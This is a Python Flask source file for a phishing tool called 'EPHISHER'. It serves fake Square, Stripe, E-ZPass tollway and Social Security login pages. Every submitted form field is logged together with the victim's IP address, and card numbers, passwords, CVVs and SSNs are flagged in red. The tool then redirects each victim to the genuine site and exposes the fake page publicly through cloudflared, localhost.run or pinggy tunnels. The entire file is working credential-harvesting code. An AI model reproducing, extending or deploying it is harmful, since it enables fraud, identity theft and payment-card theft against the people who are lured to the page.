import os
import subprocess
import threading
import time
from flask import Flask, render_template, request, redirect

# --- Configuration ---
app = Flask(__name__)
PORT = 8080  # Moved to its own line to fix SyntaxError
LOG_FILE = 'log.txt'
LINK_FILE = 'link.txt'

# GLOBAL STATE FOR TEMPLATE CHOICE
SELECTED_TEMPLATE = 'square.html'

# --- Advanced HD Color Palette ---
P = '\033[38;5;93m'    # Deep Purple (Borders)
P2 = '\033[38;5;135m'  # Bright Purple (Accents & Text)
DB = '\033[38;5;18m'   # Dark Blue - Fixed alignment
LB = '\033[38;5;33m'   # Light Blue
R = '\033[38;5;196m'   # Red (Alerts/Passwords)
W = '\033[38;5;255m'   # Bright White (Main Text)
G = '\033[1;32m'       # Green (Success/Online)
Y = '\033[38;5;226m'   # Yellow
NC = '\033[0m'         # Reset
BOLD = '\033[1m'

# --- Flask Routes ---
@app.route('/')
def index():
    return render_template(SELECTED_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.form.to_dict()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    timestamp = time.strftime('%H:%M:%S')

    with open(LOG_FILE, 'a') as f:
        f.write(f"\n{P2}╔════════════════════════════════════════════════════════════════╗{NC}\n")
        f.write(f"{P2}║{NC} {Y}[!!!] HIT DETECTED | {timestamp} | IP: {ip} {NC}\n")
        f.write(f"{P2}╠────────────────────────────────────────────────────────────────╣{NC}\n")
        for k, v in data.items():
            # Flag sensitive keywords in Red
            color = R if any(x in k.lower() for x in ['card', 'pass', 'cvv', 'ssn', 'social']) else P2
            f.write(f"{P2}║{NC}  {color}{k.upper():<12}{NC} : {W}{v}{NC}\n")
        f.write(f"{P2}╚════════════════════════════════════════════════════════════════╝{NC}\n")

    # Dynamic redirect logic
    redirect_map = {
        'stripe.html': "https://stripe.com/login",
        'tollway.html': "https://www.ezpassndr.com/login",
        'social.html': "https://secure.ssa.gov/RIL/SiView.action"
    }
    target = redirect_map.get(SELECTED_TEMPLATE, "https://squareup.com/login")
    return redirect(target)

# --- Menu & Logic Functions ---
def run_flask():
    # host 0.0.0.0 makes the server accessible on the local network
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def clear():
    os.system('clear')

def get_ip():
    try:
        return os.popen("hostname -I | awk '{print $1}'").read().strip()
    except:
        return "127.0.0.1"

def start_tunnel(choice):
    cmd = ""
    if choice == '1':
        cmd = f"nohup cloudflared tunnel --url http://localhost:{PORT} > {LINK_FILE} 2>&1 &"
    elif choice == '2':
        cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{PORT} nokey@localhost.run > {LINK_FILE} 2>&1 &"
    elif choice == '3':
        cmd = f"ssh -p 443 -o StrictHostKeyChecking=no -R0:localhost:{PORT} a.pinggy.io > {LINK_FILE} 2>&1 &"

    if cmd:
        os.system(cmd)
        print(f"\n{P2}  [*] Booting secure tunnel... Please wait.{NC}")
        time.sleep(10)
        # Regex to grab the public URL from the log file
        url = os.popen(f"grep -oE 'https?://[a-zA-Z0-9.-]+\\.(trycloudflare\\.com|lhr\\.life|pinggy\\.link)' {LINK_FILE} | head -n 1").read().strip()
        return url
    return None

def main_menu():
    global SELECTED_TEMPLATE
    clear()
    print(f"{P}┌──────────────────────────────────────────────────────────────────┐{NC}")
    print(f"{P}│{NC} {W}{BOLD}███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗{NC}       {P}│{NC}")
    print(f"{P}│{NC} {P2}██╔════╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗{NC}       {P}│{NC}")
    print(f"{P}│{NC} {W}{BOLD}█████╗  ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝{NC}       {P}│{NC}")
    print(f"{P}│{NC} {P2}██╔══╝  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗{NC}       {P}│{NC}")
    print(f"{P}│{NC} {W}{BOLD}███████╗██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║{NC}       {P}│{NC}")
    print(f"{P}│{NC} {P2}╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{NC}       {P}│{NC}")
    print(f"{P}├──────────────────────────────────────────────────────────────────┤{NC}")
    print(f"{P}│{NC}  {W}{BOLD}CHOOSE TEMPLATE:{NC}{' ' * 49}{P}│{NC}")
    print(f"{P}│{NC}  {P2}[1]{NC} {W}Square{NC}    {P2}[2]{NC} {W}Stripe{NC}    {P2}[3]{NC} {W}Tollway{NC}    {P2}[4]{NC} {W}SocialSecurity{NC}{' ' * 4}{P}│{NC}")
    print(f"{P}├──────────────────────────────────────────────────────────────────┤{NC}")

    t_choice = input(f"\n  {P2}TEMPLATE SELECTION (1-4) » {NC}")
    templates = {'1': 'square.html', '2': 'stripe.html', '3': 'tollway.html', '4': 'social.html'}
    SELECTED_TEMPLATE = templates.get(t_choice, 'square.html')

    clear()
    main_menu_tunnels()

def main_menu_tunnels():
    print(f"{P}┌──────────────────────────────────────────────────────────────────┐{NC}")
    print(f"{P}│{NC}  {W}{BOLD}STATUS{NC}    : {G}ONLINE{NC} {P2}●{NC}                   {W}{BOLD}PORT{NC}    : {P2}{PORT}{NC}{' ' * 11}{P}│{NC}")
    print(f"{P}├──────────────────────────────────────────────────────────────────┤{NC}")
    print(f"{P}│{NC}  {P2}[1]{NC} {W}Cloudflared{NC}          {P2}[2]{NC} {W}Localhost.run{NC}{' ' * 22}{P}│{NC}")
    print(f"{P}│{NC}  {P2}[3]{NC} {W}Pinggy.io{NC}            {R}[4]{NC} {W}Exit{NC}{' ' * 33}{P}│{NC}")
    print(f"└──────────────────────────────────────────────────────────────────┘")

    choice = input(f"\n  {P2}TUNNEL SELECTION » {NC}")
    if choice == '4':
        return

    public_url = start_tunnel(choice)
    local_ip = get_ip()

    clear()
    print(f"{P}┌──────────────────────────────────────────────────────────────────┐{NC}")
    print(f"{P}│{NC} {W}{BOLD}                EPHISHER LIVE DATA STREAM                 {NC}{' ' * 8}{P}│{NC}")
    print(f"  {P2}■{NC} {W}TEMPLATE{NC}    : {Y}{SELECTED_TEMPLATE.split('.')[0].upper()}{NC}")
    print(f"  {P2}■{NC} {W}NETWORK IP{NC}  : {P2}http://{local_ip}:{PORT}{NC}")
    print(f"  {P2}■{NC} {W}PUBLIC URL{NC}  : {G}{BOLD}{public_url}{NC}")
    print(f"{P}────────────────────────────────────────────────────────────────────{NC}")
    print(f"{P2}{BOLD} [*] LISTENING FOR INCOMING DATA...{NC}\n")

    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'a').close()

    os.system(f"tail -f {LOG_FILE}")

if __name__ == '__main__':
    # Cleanup old processes
    os.system(f"pkill -f cloudflared; pkill -f ssh")
    
    # Initialize files
    for f_path in [LOG_FILE, LINK_FILE]:
        if not os.path.exists(f_path):
            with open(f_path, 'w') as f: pass
            
    # Start Flask in a background thread
    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(1)
    main_menu()

